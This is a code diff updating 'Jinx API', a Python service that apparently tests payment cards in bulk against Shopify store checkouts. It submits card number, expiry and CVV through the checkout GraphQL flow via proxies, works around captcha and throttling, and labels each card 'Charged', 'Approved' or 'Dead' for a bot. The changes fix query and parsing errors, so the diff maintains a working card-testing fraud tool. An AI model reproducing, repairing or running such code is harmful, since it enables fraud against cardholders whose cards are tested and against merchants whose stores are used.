@@ -1,12 +1,13 @@
 #!/usr/bin/env python3
 """
-Jinx API — ShopifyK-Based Shopify Checker (v6.1 FIXED)
+Jinx API — ShopifyK-Based Shopify Checker (v6.2 FINAL)
 ========================================================
 Based on ShopifyK.py workflow
-Fixes:
+FIXED:
+  - GraphQL union type error (Selections can't be made directly on unions)
+  - $$0.25 → $0.25
   - UNKNOWN_ERROR → tigyi error codes
-  - $$0.25 → $0.25 (price cleanup)
-  - Session token OK → continue to proposal (exception handling)
+  - Session token OK → continue to proposal
 """
 
 import os
@@ -41,7 +42,7 @@ except ImportError:
 
 
 BRAND = "Jinx"
-VERSION = "6.1.0"
+VERSION = "6.2.0"
 HOST = os.environ.get("API_HOST", "0.0.0.0")
 PORT = int(os.environ.get("PORT", "8080"))
 WORKERS = int(os.environ.get("API_WORKERS", "20"))
@@ -173,7 +174,6 @@ def clean_price(raw):
     s = str(raw).strip()
     if not s or s in ("-", "0.00", "$0.00", "0", "$0"):
         return "-"
-    # Remove all $ signs
     s = s.replace("$", "").strip()
     try:
         val = float(s)
@@ -214,6 +214,97 @@ def extract_clean_response(message):
         if "_" in first_word and first_word.isupper():
             return first_word
     return message[:50]
+
+
+# ═══ FIXED QUERIES (GraphQL union type safe) ═══
+PROPOSAL_QUERY = (
+    "query Proposal($delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,"
+    "$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,"
+    "$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,"
+    "$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,"
+    "$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,"
+    "$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,"
+    "$optionalDuties:OptionalDutiesInput,$captcha:CaptchaInput){"
+    "session(sessionInput:$sessionInput){"
+    "negotiate(input:{"
+    "purchaseProposal:{"
+    "delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,"
+    "buyerIdentity:$buyerIdentity,taxes:$taxes,tip:$tip,note:$note,"
+    "nonNegotiableTerms:$nonNegotiableTerms,"
+    "localizationExtension:$localizationExtension,"
+    "scriptFingerprint:$scriptFingerprint,"
+    "optionalDuties:$optionalDuties,captcha:$captcha},"
+    "checkpointData:$checkpointData,"
+    "queueToken:$queueToken}){"
+    "__typename "
+    "result{"
+    "... on NegotiationResultAvailable{"
+    "checkpointData queueToken "
+    "sellerProposal{"
+    "runningTotal{value{amount currencyCode}}"
+    "delivery{"
+    "... on FilledDeliveryTerms{"
+    "deliveryLines{id "
+    "availableDeliveryStrategies{"
+    "handle "
+    "amount{value{amount currencyCode}}"
+    "}"
+    "}"
+    "}"
+    "}"
+    "payment{"
+    "... on FilledPaymentTerms{"
+    "availablePaymentLines{"
+    "paymentMethod{"
+    "name paymentMethodIdentifier"
+    "}"
+    "}"
+    "}"
+    "}"
+    "tax{"
+    "... on FilledTaxTerms{"
+    "totalTaxAmount{value{amount currencyCode}}"
+    "}"
+    "}"
+    "}"
+    "}"
+    "... on CheckpointDenied{redirectUrl}"
+    "... on Throttled{pollAfter queueToken pollUrl}"
+    "... on NegotiationResultFailed{__typename}"
+    "}"
+    "errors{code localizedMessage}"
+    "}"
+    "}"
+)
+
+SUBMIT_QUERY = (
+    "mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,"
+    "$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,"
+    "$analytics:AnalyticsInput){"
+    "submitForCompletion(input:$input attemptToken:$attemptToken "
+    "metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult "
+    "analytics:$analytics){"
+    "... on SubmitSuccess{receipt{id token}}"
+    "... on SubmitAlreadyAccepted{receipt{id token}}"
+    "... on SubmitFailed{reason}"
+    "... on SubmitRejected{errors{code localizedMessage nonLocalizedMessage}}"
+    "... on Throttled{pollAfter pollUrl queueToken}"
+    "... on CheckpointDenied{redirectUrl}"
+    "... on SubmittedForCompletion{receipt{id token}}"
+    "}"
+    "}"
+)
+
+POLL_QUERY = (
+    "query PollForReceipt($receiptId:ID!,$sessionToken:String!){"
+    "receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){"
+    "... on ProcessedReceipt{id token orderIdentity{buyerIdentifier id}}"
+    "... on ProcessingReceipt{id pollDelay}"
+    "... on ActionRequiredReceipt{id action{... on CompletePaymentChallenge{offsiteRedirect url}}}"
+    "... on FailedReceipt{id processingError{... on PaymentFailed{code messageUntranslated}}}"
+    "}"
+    "}"
+)
 
 
 # ═══ ShopifyK.py PROCESS_CARD (Async) ═══
@@ -276,7 +367,7 @@ async def make_graphql_request(session, graphql_url, params, headers, json_data)
 
 
 async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None, debug_log=None):
-    """Full ShopifyK.py logic - always returns a message string"""
+    """Full ShopifyK.py logic"""
     gateway = "UNKNOWN"
     total_price = "0.00"
     currency = "USD"
@@ -387,7 +478,10 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             )
             if not subtotal:
                 price_match = re.search(r'"price":\s*"([\d.]+)"', text)
-                subtotal = price_match.group(1) if price_match else total_price
+                if price_match:
+                    subtotal = price_match.group(1)
+                else:
+                    subtotal = str(total_price).replace("$", "").strip() or "0.01"
 
             if not sst:
                 dbg("No session token")
@@ -471,8 +565,8 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 session, graphql_url, params, headers, json_data
             )
             if not response:
-                dbg(f"Proposal request failed: {resp_text}")
-                return False, f"PROPOSAL_REQUEST_FAILED", gateway, total_price, currency
+                dbg(f"Proposal request failed: {resp_text[:60]}")
+                return False, "PROPOSAL_REQUEST_FAILED", gateway, total_price, currency
             if is_captcha_required(resp_text):
                 dbg("CAPTCHA_REQUIRED")
                 return False, "CAPTCHA_REQUIRED", gateway, total_price, currency
@@ -481,11 +575,14 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 resp_json = json.loads(resp_text)
             except json.JSONDecodeError as e:
                 dbg(f"Invalid JSON: {str(e)[:60]}")
-                return False, f"INVALID_JSON_PROPOSAL", gateway, total_price, currency
+                return False, "INVALID_JSON_PROPOSAL", gateway, total_price, currency
 
             if 'errors' in resp_json:
                 error_msgs = [e.get('message', str(e)) for e in resp_json['errors'][:3]]
                 clean = extract_clean_response("; ".join(error_msgs))
+                if 'union' in clean.lower() or 'selections' in clean.lower():
+                    dbg(f"GraphQL Schema Error: {clean}")
+                    return False, "GRAPHQL_SCHEMA_ERROR", gateway, total_price, currency
                 dbg(f"GraphQL Error: {clean}")
                 return False, clean, gateway, total_price, currency
 
@@ -508,7 +605,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 running_total = seller_proposal['runningTotal']['value']['amount']
             except (KeyError, TypeError) as e:
                 dbg(f"Proposal parse error: {str(e)[:60]}")
-                return False, f"PROPOSAL_PARSE_ERROR", gateway, total_price, currency
+                return False, "PROPOSAL_PARSE_ERROR", gateway, total_price, currency
 
             if not delivery_data:
                 return False, "NO_DELIVERY_DATA", gateway, total_price, currency
@@ -702,9 +799,9 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
 
                 if result_type in ['SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted']:
                     receipt = submit_data.get('receipt', {})
-                    if receipt.get('__typename') == 'ProcessedReceipt':
+                    if receipt:
                         return True, "ORDER_PLACED", gateway, total_price, currency
-                    rid = receipt.get('id')
+                    return False, "NO_RECEIPT", gateway, total_price, currency
                 elif result_type == 'SubmitFailed':
                     return False, extract_clean_response(submit_data.get('reason', 'SUBMIT_FAILED')), gateway, total_price, currency
                 elif result_type == 'SubmitRejected':
@@ -727,9 +824,9 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 if not rid:
                     return False, "NO_RECEIPT_ID", gateway, total_price, currency
             except json.JSONDecodeError:
-                return False, f"INVALID_JSON_SUBMIT", gateway, total_price, currency
-            except Exception as e:
-                return False, f"SUBMIT_PARSE_ERROR", gateway, total_price, currency
+                return False, "INVALID_JSON_SUBMIT", gateway, total_price, currency
+            except Exception:
+                return False, "SUBMIT_PARSE_ERROR", gateway, total_price, currency
 
             # ── 6. Poll ──
             params = {'operationName': 'PollForReceipt'}
@@ -814,71 +911,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
         return False, f"EXCEPTION_{type(e).__name__}", gateway, total_price, currency
 
 
-# ═══ QUERIES ═══
-PROPOSAL_QUERY = (
-    "query Proposal($delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,"
-    "$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,"
-    "$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,"
-    "$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,"
-    "$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,"
-    "$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,"
-    "$optionalDuties:OptionalDutiesInput,$captcha:CaptchaInput){"
-    "session(sessionInput:$sessionInput){negotiate(input:{"
-    "purchaseProposal:{delivery:$delivery,discounts:$discounts,payment:$payment,"
-    "merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,tip:$tip,"
-    "note:$note,nonNegotiableTerms:$nonNegotiableTerms,"
-    "localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,"
-    "optionalDuties:$optionalDuties,captcha:$captcha},checkpointData:$checkpointData,"
-    "queueToken:$queueToken}){__typename result{"
-    "...on NegotiationResultAvailable{checkpointData queueToken "
-    "sellerProposal{runningTotal{value{amount currencyCode __typename}__typename}"
-    "subtotalBeforeTaxesAndShipping{value{amount currencyCode __typename}__typename}"
-    "delivery{...on FilledDeliveryTerms{deliveryLines{id "
-    "availableDeliveryStrategies{handle amount{value{amount currencyCode __typename}__typename}__typename}"
-    "__typename}__typename}__typename}"
-    "payment{...on FilledPaymentTerms{availablePaymentLines{paymentMethod{"
-    "name paymentMethodIdentifier __typename}__typename}__typename}__typename}"
-    "tax{...on FilledTaxTerms{totalTaxAmount{value{amount currencyCode __typename}__typename}__typename}__typename}"
-    "__typename}__typename}...on CheckpointDenied{redirectUrl __typename}"
-    "...on Throttled{pollAfter queueToken pollUrl __typename}"
-    "...on NegotiationResultFailed{__typename}__typename}"
-    "errors{code localizedMessage __typename}__typename}}}"
-)
-
-SUBMIT_QUERY = (
-    "mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,"
-    "$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,"
-    "$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken "
-    "metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult "
-    "analytics:$analytics){"
-    "...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}"
-    "...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}"
-    "...on SubmitFailed{reason __typename}"
-    "...on SubmitRejected{errors{...on NegotiationError{code localizedMessage nonLocalizedMessage __typename}__typename}__typename}"
-    "...on Throttled{pollAfter pollUrl queueToken __typename}"
-    "...on CheckpointDenied{redirectUrl __typename}"
-    "...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}"
-    "fragment ReceiptDetails on Receipt{"
-    "...on ProcessedReceipt{id token orderIdentity{buyerIdentifier id __typename}__typename}"
-    "...on ProcessingReceipt{id pollDelay __typename}"
-    "...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}"
-    "...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}"
-    "__typename}"
-)
-
-POLL_QUERY = (
-    "query PollForReceipt($receiptId:ID!,$sessionToken:String!){"
-    "receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){"
-    "...ReceiptDetails __typename}}"
-    "fragment ReceiptDetails on Receipt{"
-    "...on ProcessedReceipt{id token orderIdentity{buyerIdentifier id __typename}__typename}"
-    "...on ProcessingReceipt{id pollDelay __typename}"
-    "...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}"
-    "...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}"
-    "__typename}"
-)
-
-
 # ═══ KNOWN DECLINES ═══
 KNOWN_DECLINES = {
     "CARD_DECLINED": "CARD_DECLINED",
@@ -915,7 +947,6 @@ KNOWN_DECLINES = {
 
 
 def parse_response(raw_message, success_flag=False):
-    """Always return a valid (code, label, is_ok)"""
     if success_flag:
         return "ORDER_PLACED", "Order Placed", True
 
@@ -928,18 +959,15 @@ def parse_response(raw_message, success_flag=False):
 
     upper = text.upper()
 
-    # Try exact known matches first
     for key in sorted(KNOWN_DECLINES.keys(), key=len, reverse=True):
         if key in upper:
             code = KNOWN_DECLINES[key]
             return code, code.replace("_", " ").title(), code == "ORDER_PLACED"
 
-    # Try extracting code
     clean = extract_clean_response(text)
     if clean and clean != "UNKNOWN_ERROR":
         return clean, clean.replace("_", " ").title(), False
 
-    # Last resort — never return UNKNOWN_ERROR
     return "CARD_DECLINED", text[:60], False
 
 
@@ -974,26 +1002,27 @@ def run_check(site, cc, proxy=None, debug=False):
             "Debug": " | ".join(debug_log) if debug_log else str(e)[:80],
         }
 
-    # Ensure message is never None/empty
     if not message:
         message = "CARD_DECLINED"
 
     code, label, is_ok = parse_response(message, success)
 
-    # Determine status
     if is_ok:
         status = "Charged"
     elif code in ("3DS_REQUIRED", "OTP_REQUIRED", "INSUFFICIENT_FUNDS"):
         status = "Approved"
-    elif any(x in code for x in ("SITE", "PROXY", "CAPTCHA", "THROTTLED", "CHECKPOINT", "REQUEST", "INVALID_JSON", "PROPOSAL", "NO_SESSION", "NO_DELIVERY", "NO_PAYMENT", "VAULT", "EMPTY_SUBMIT", "SUBMIT_PARSE", "POLL", "CHANGE_PROXY", "EXCEPTION")):
+    elif any(x in code for x in (
+        "SITE", "PROXY", "CAPTCHA", "THROTTLED", "CHECKPOINT", "REQUEST",
+        "INVALID_JSON", "PROPOSAL", "NO_SESSION", "NO_DELIVERY", "NO_PAYMENT",
+        "VAULT", "EMPTY_SUBMIT", "SUBMIT_PARSE", "POLL", "CHANGE_PROXY",
+        "EXCEPTION", "GRAPHQL_SCHEMA"
+    )):
         status = "Site Error"
     else:
         status = "Dead"
 
-    # Build price with clean format
     price_display = clean_price(price_raw)
 
-    # Response text for bot.py
     if is_ok:
         response_text = "ORDER_PLACED"
     elif code == "3DS_REQUIRED":
@@ -1071,7 +1100,7 @@ class Handler(BaseHTTPRequestHandler):
             try:
                 result = executor.submit(run_check, site, cc, proxy, debug).result(timeout=180)
                 self._send_json(200, result)
-            except Exception as e:
+            except Exception:
                 self._send_json(500, {
                     "Response": "CARD_DECLINED",
                     "Price": "-",
@@ -1092,7 +1121,7 @@ executor = ThreadPoolExecutor(max_workers=WORKERS)
 def main():
     print()
     print("╔══════════════════════════════════════════════════════════╗")
-    print(f"║  {BRAND} API v{VERSION} (ShopifyK-Based FIXED)              ║")
+    print(f"║  {BRAND} API v{VERSION} (ShopifyK FIXED)                    ║")
     print("╚══════════════════════════════════════════════════════════╝")
     print(f"  Listening : http://{HOST}:{PORT}")
     print(f"  Workers   : {WORKERS}")
